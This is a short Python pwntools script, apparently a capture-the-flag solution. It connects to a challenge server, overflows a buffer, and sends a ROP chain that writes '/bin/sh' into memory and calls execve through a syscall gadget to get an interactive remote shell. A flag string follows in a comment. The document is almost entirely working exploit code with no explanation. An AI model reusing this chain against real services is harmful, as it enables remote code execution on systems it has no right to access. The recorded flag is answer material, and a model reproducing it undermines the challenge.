from pwn import *
p=remote("chal.78727867.xyz", 34000)
print(p.recvline())

pop_rax_ret=p64(0x00000000004297c3)
pop_rsi_pop_rbp_ret=p64(0x0000000000403d5a)
syscall=p64(0x00000000004025ea)
mov_qword_ptr_rdi_rax_ret=p64(0x000000000043f04b) 

#rdx=0
payload=b"A"*31+b"\x00"+b"A"*24  #offset
payload+=pop_rax_ret+p64(0x0068732f6e69622f)
payload+=mov_qword_ptr_rdi_rax_ret #rdi pointing to --> /bin/sh
payload+=pop_rax_ret+p64(0x3b) #sysvalue rax=59
payload += pop_rsi_pop_rbp_ret + p64(0) + p64(0) + syscall #rsi=0 + syscall

p.sendline(payload)
p.interactive()
p.close()

#NHNC{a_rop_challenge_which_LemonTea_can_solve_and_i_wanna_sleep_lemontea_u_sucker_6f325c6517bd7789}
